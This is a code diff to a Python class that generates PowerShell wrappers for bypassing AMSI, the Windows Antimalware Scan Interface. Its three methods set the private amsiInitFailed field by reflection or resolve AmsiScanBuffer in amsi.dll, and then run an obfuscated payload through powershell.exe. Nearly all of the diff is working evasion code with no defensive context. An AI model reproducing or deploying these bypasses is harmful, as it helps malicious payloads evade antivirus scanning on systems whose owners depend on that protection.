@@ -29,27 +29,26 @@ class AMSIBypass:
             return self._context_bypass(payload)
     
     def _memory_patch_bypass(self, payload):
-        """Memory patching AMSI bypass that preserves obfuscated payload"""
-        # Simplified AMSI bypass that wraps the obfuscated payload
+        """Memory patching AMSI bypass for Windows PowerShell"""
         var_name = ''.join(random.choices(string.ascii_lowercase, k=6))
         
-        bypass_code = f'''
-# AMSI Memory Patch Bypass
+        bypass_code = f'''# AMSI Memory Patch Bypass for Windows
 ${var_name} = [Ref].Assembly.GetTypes()
 ${var_name} = ${var_name} | Where-Object {{$_.Name -like "*iUtils"}}
 ${var_name}.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-# Execute obfuscated payload
+# Execute obfuscated payload via PowerShell
+powershell.exe -Command "
 {payload}
+"
 '''
         return bypass_code
     
     def _api_hook_bypass(self, payload):
-        """API hooking AMSI bypass that preserves obfuscated payload"""
+        """API hooking AMSI bypass for Windows"""
         var_name = ''.join(random.choices(string.ascii_lowercase, k=6))
         
-        bypass_code = f'''
-# AMSI API Hook Bypass
+        bypass_code = f'''# AMSI API Hook Bypass for Windows
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -64,22 +63,25 @@ public class Win32 {{
 ${var_name} = [Win32]::LoadLibrary("amsi.dll")
 ${var_name} = [Win32]::GetProcAddress(${var_name}, "AmsiScanBuffer")
 
-# Execute obfuscated payload
+# Execute obfuscated payload via PowerShell
+powershell.exe -Command "
 {payload}
+"
 '''
         return bypass_code
     
     def _context_bypass(self, payload):
-        """Context-based AMSI bypass that preserves obfuscated payload"""
+        """Context-based AMSI bypass for Windows"""
         var_name = ''.join(random.choices(string.ascii_lowercase, k=6))
         
-        bypass_template = f'''
-# AMSI Context Bypass
+        bypass_template = f'''# AMSI Context Bypass for Windows
 ${var_name} = [System.Management.Automation.PSTypeName]('System.Management.Automation.AmsiUtils').Type
 ${var_name}.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-# Execute obfuscated payload
+# Execute obfuscated payload via PowerShell
+powershell.exe -Command "
 {payload}
+"
 '''
         return bypass_template
     
